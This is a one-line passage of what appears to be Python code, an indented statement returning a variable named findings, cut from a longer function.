        return findings
